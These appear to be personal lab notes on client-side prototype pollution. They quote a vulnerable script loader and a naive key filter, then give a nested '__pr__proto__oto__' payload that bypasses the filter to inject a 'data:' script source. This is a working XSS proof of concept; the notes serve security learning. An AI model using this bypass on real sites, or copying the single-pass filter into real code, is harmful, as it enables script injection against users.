/*

a) Some form of weak validation is in place
// searchLoggerFiltered.js

async function searchLogger() {
    // create config object from URL query parameters 
    let config = {params: deparam(new URL(location).searchParams.toString())};
    // transport_url property
    if(config.transport_url) {
        // create script element
        let script = document.createElement('script');
        // set the src of the script to the transport_url property of config object
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}

function sanitizeKey(key) {
    let badProperties = ['constructor','__proto__','prototype'];
    for(let badProperty of badProperties) {
        key = key.replaceAll(badProperty, '');
    }
    return key;
}

2) /?__proto__[transport_url]=foo 
//no 

/?__pr__proto__oto__[transport_url]=foo
// yes

3) /?__pr__proto__oto__[transport_url]=data:,alert(1);


>> Object.prototype
Object { transport_url: "data:,alert(1);", … }


*/